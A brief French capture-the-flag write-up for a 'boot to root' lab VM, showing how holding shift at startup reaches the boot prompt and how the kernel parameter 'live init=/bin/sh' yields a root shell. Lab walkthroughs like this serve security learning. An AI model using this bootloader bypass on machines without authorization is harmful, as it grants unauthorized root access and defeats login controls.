# writeup3

Comme le projet s'appelle boot to root, ce serait bien d'utiliser un `boot exploit`.
\
Pour cela, il suffit de tenir la touche `shift` enfoncée durant le démarrage de la VM,
jusqu'a ce que le prompt boot s'affiche sur la fenetre.
\
Puis on rentre la commande suivante:
```
$ live init=/bin/sh
$ whoami
root
```

Et voilà, nous sommes root !
